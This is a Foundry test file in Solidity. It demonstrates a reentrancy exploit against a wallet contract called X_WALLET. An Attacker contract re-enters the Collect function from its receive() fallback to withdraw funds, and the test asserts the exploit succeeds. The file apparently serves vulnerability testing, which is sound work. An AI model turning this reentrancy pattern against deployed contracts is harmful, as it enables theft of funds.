
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/X_WALLET.sol";

contract TestReentrancyX_WALLET is Test {

    X_WALLET public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new X_WALLET(address(new Log(address(0))));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal < type(uint128).max / 2);

        _contractUnderTest.Put{value: attackVal * 2}(block.timestamp + 100);
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackVal;

    constructor(address victimAddress) {
        victim = X_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackVal = val;
        victim.Put{value: val}(block.timestamp + 100);
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.Acc(address(this)).balance;

        victim.Collect{value: 0}(val);

        if (victim.Acc(address(this)).balance < initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            victim.Collect{value: 0}(attackVal);
            attackCallCount++;
        }
    }
}
